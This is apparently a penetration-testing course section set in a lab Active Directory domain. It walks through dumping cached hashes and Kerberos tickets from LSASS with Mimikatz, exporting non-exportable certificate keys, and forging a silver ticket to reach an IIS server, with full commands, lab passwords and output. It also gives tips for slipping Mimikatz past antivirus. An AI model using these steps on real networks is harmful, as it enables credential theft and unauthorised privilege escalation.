# cached ad creds

To lay the foundation for cached storage credential attacks and lateral movement vectors in the Module _Lateral Movement in Active Directory_, we must first discuss the various password hashes used with Kerberos and show how they are stored.

We already covered some of the following information in the _Password Attacks_ Module. In this section, we'll focus on cached credentials and tickets in the context of AD.

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere to renew a TGT request.

In modern versions of Windows, these hashes are stored in the [_Local Security Authority Subsystem Service_](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (LSASS) memory space.

Info

We can find an excellent reference guide [here](https://adsecurity.org/?page_id=1821).

If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

Although this is the end goal of our AD attack, the process is not as straightforward as it seems. Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.

Because of this, we often have to start our attack with a local privilege escalation in order to retrieve the stored hashes. To make things even more tricky, the data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key.

Nevertheless, since the extraction of cached credentials is a large attack vector against Windows and Active Directory, several tools have been created to extract the hashes. The most popular of these tools is [_Mimikatz_](https://github.com/gentilkiwi/mimikatz).

Let's try to use Mimikatz to extract domain hashes on our Windows 11 system.

In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the _Antivirus Evasion_ Module instead. For example, execute Mimikatz directly from memory using an injector like [PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like Task Manager to dump the entire [LSASS process memory](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/), move the dumped data to a helper machine, and then load the data into [Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html).

Since the _jeff_ domain user is a local administrator on CLIENT75, we can launch a PowerShell prompt with elevated privileges. First, let's connect to this machine as _jeff_ with the password _HenchmanPutridBonbon11_ over RDP.

```
kali@kali:~$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75         
  
```

> Listing 1 - Connecting to CLIENT75 via RDP

Once connected, we start a PowerShell session as Administrator. From this command prompt, we can start [Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) and enter **privilege::debug** to engage the [_SeDebugPrivlege_](https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716\(v=vs.85\).aspx) privilege, which will allow us to interact with a process owned by another account.

```
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools\> .\mimikatz.exe
...

mimikatz # privilege::debug
Privilege '20' OK
```

> Listing 2 - Starting Mimikatz and enabling SeDebugPrivilege

Now we can run **sekurlsa::logonpasswords** to dump the credentials of all logged-on users with the [_Sekurlsa_](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) module.

This should dump hashes for all users logged on to the current workstation or server, _including remote logins_ like Remote Desktop sessions.

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
```

> Listing 3 - Executing Mimikatz on a domain workstation

The output above shows all credential information stored in LSASS for the domain users _jeff_ and _dave_, including cached hashes.

An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional [_LSA Protection_](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection). The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process. We'll discuss how to bypass this and other powerful defensive mechanisms in-depth in OffSec's _Evasion Techniques and Breaching Defenses_ course, PEN-300.

We can observe two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, [WDigest](https://technet.microsoft.com/en-us/library/cc778868\(v=ws.10\).aspx) will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes.

Armed with these hashes, we could attempt to crack them and obtain the cleartext password as we did in _Password Attacks_.

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.

Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path **\\web04.corp.com\backup**. This will create and cache a service ticket.

```
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt

```

> Listing 4 - Displaying contents of a SMB share

Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering **sekurlsa::tickets**.

```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

> Listing 5 - Extracting Kerberos tickets with mimikatz

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later in this and the next Module.

Mimikatz can also export tickets to the hard drive and import tickets into LSASS, which we will explore later.

Before covering attacks on AD authentication mechanisms, let's briefly explore the use of [_Public Key Infrastructure_](https://en.wikipedia.org/wiki/Public_key_infrastructure) (PKI) in AD. Microsoft provides the AD role [_Active Directory Certificate Services_](https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-certificate-services/) (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources.

If a server is installed as a [_Certification Authority_](https://en.wikipedia.org/wiki/Certificate_authority) (CA), it can issue and revoke digital certificates (and much more). While a deep discussion on these concepts would require its own Module, let's focus on one aspect of cached and stored objects related to AD CS.

For example, we could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via [_Smart Cards_](https://en.wikipedia.org/wiki/Smart_card).

These certificates may be marked as having a [_non-exportable private key_](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/marking-private-keys-as-non-exportable-with-certutil-importpfx/ba-p/1128390) for security reasons. If so, a private key associated with a certificate cannot be exported even with administrative privileges. However, there are various methods to export the certificate with the private key.

We can rely again on Mimikatz to accomplish this. The [_crypto_](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto) module contains the capability to either patch the [_CryptoAPI_](https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptoapi-system-architecture) function with [**crypto::capi**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi) or [_KeyIso_](http://revertservice.com/10/keyiso/) service with [**crypto::cng**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng),making non-exportable keys exportable.

As we've now covered in this section and in _Password Attacks_, Mimikatz can extract information related to authentication performed through most protocols and mechanisms, making this tool a real Swiss Army knife for cached credentials!


# 23.2.4. Silver Tickets

In the previous section, we obtained and cracked a TGS-REP hash to retrieve the plaintext password of an SPN. In this section, we'll go one step further and forge our own service tickets.

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in most environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.

[_Privileged Account Certificate_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962) (PAC) [validation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84) is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.

As an example, if we authenticate against an IIS server that is executing in the context of the service account _iis_service_, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a [_silver ticket_](https://adsecurity.org/?p=2011) and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

In this section's example, we'll create a silver ticket to get access to an HTTP SPN resource. As we identified in the previous section, the _iis_service_ user account is mapped to an HTTP SPN. Therefore, the password hash of the user account is used to create service tickets for it. For the purposes of this example, let's assume we've identified that the _iis_service_ user has an established session on CLIENT75.

In general, we need to collect the following three pieces of information to create a silver ticket:

- SPN password hash
- Domain SID
- Target SPN

Let's get straight into the attack by connecting to CLIENT75 via RDP as _jeff_ with the password _HenchmanPutridBonbon11_.

First, let's confirm that our current user has no access to the resource of the HTTP SPN mapped to _iis_service_. To do so, we'll use [**iwr**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) and enter **-UseDefaultCredentials** so that the credentials of the current user are used to send the web request.

```
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error

  401 - Unauthorized: Access is denied due to invalid credentials.
  You do not have permission to view this directory or page using the credentials that you supplied.

At line:1 char:1
+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

> Listing 24 - Trying to access the web page on WEB04 as user _jeff_

Listing 24 shows that we cannot access the web page as _jeff_. Let's start collecting the information needed to forge a silver ticket.

Since we are a local Administrator on this machine where _iis_service_ has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of _iis_service_), which is the first piece of information we need to create a silver ticket.

Let's start PowerShell as Administrator and launch Mimikatz. As we already learned, we can use **privilege::debug** and **sekurlsa::logonpasswords** to extract cached AD credentials.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```

> Listing 25 - Using Mimikatz to obtain the NTLM hash of the user account _iis_service_ which is mapped to the target SPN

Listing 25 shows the password hashes of the _iis_service_ user account. The NTLM hash of the service account is the first piece of information we need to create the silver ticket.

Now, let's obtain the domain SID, the second piece of information we need. We can enter **whoami /user** to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.

As covered in the _Windows Privilege Escalation_ Module, the SID consists of several parts. Since we're only interested in the Domain SID, we'll omit the RID of the user.

```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

> Listing 26 - Obtaining the domain SID

The highlighted section in listing 26 shows the domain SID.

The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (_HTTP/web04.corp.com:80_) because we want to access the web page running on IIS.

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the _kerberos::golden_ module. This module provides the capabilities for creating golden and silver tickets alike. We'll explore the concept of golden tickets in the Module _Lateral Movement in Active Directory_.

We need to provide the domain SID (**/sid:**), domain name (**/domain:**), and the target where the SPN runs (**/target:**). We also need to include the SPN protocol (**/service:**), NTLM hash of the SPN (**/rc4:**), and the **/ptt** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

Finally, we must enter an existing domain user for **/user:**. This user will be set in the forged ticket. For this example, we'll use _jeffadmin_. However, we could also use any other domain user since we can set the permissions and groups ourselves.

The complete command can be found in the following listing:

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
```

> Listing 27 - Forging the service ticket with the user _jeffadmin_ and injecting it into the current session

As shown in Listing 27, a new service ticket for the SPN _HTTP/web04.corp.com_ has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group ( _Relative Id: 512_ ) as highlighted above.

This means we should have the ticket ready to use in memory. We can confirm this with **klist**.

```
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

> Listing 28 - Listing Kerberos tickets to confirm the silver ticket is submitted to the current session

Listing 28 shows that we have the silver ticket for _jeffadmin_ to access _http/web04.corp.com_ submitted to our current session. This should allow us to access the web page on WEB04 as _jeffadmin_.

Let's verify our access using the same command as before.

```
PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 703
                    Content-Type: text/html
                    Date: Wed, 14 Sep 2022 11:37:39 GMT
                    ETag: "b752f823fc8d81:0"
                    Last-Modified: Wed, 14 Sep 20...
Forms             :
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
                    text/html]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        :
RawContentLength  : 703
```

> Listing 29 - Accessing the SMB share with the silver ticket

Great! We successfully forged a service ticket and got access to the web page as _jeffadmin_. It's worth noting that we performed this attack without access to the plaintext password or password hash of this user.

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.

Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the [PAC structure](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041). With this patch in place, the extended PAC structure field _PAC_REQUESTOR_ needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.

In this section, we learned how to forge service tickets by using the password hash of a target SPN. While we used an SPN run by a user account in the example, we could do the same for SPNs run in the context of a machine account.